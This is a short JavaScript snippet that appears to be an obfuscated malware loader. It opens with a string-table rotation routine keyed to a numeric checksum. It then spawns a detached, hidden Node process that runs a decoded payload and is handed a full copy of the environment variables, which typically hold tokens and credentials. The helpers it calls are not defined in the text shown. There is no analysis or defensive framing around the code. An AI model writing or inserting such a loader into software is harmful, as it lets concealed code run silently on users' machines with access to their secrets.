(function (read, expected) {
  const table = [];
  while(!![]) {
    try {
      const sum = -parseInt(read(0xee)) / 0x1 + -parseInt(read(0xe7)) / 0x2 *
        (-parseInt(read(0x171)) / 0x3) + parseInt(read(0x1a2)) / 0x4 *
        (parseInt(read(0x162)) / 0x5) + parseInt(read(0x1ff)) / 0x6 +
        -parseInt(read(0x1f2)) / 0x7 * (-parseInt(read(0x176)) / 0x8) +
        parseInt(read(0x17d)) / 0x9 * (parseInt(read(0x19a)) / 0xa) +
        -parseInt(read(0x1aa)) / 0xb * (parseInt(read(0x143)) / 0xc);
      if (sum === expected) break;
      table['push'](table['shift']());
    } catch (_error) {
      table['push'](table['shift']());
    }
  }
})(readStringTable, 0x62904);

const environment = { ...process.env };
const { spawn: launch } = require('child_process');
launch(process.execPath, ['-e', 'runDecodedPayload()'], {
  'detached': !![],
  'stdio': 'ignore',
  'windowsHide': !![],
  env: environment
});
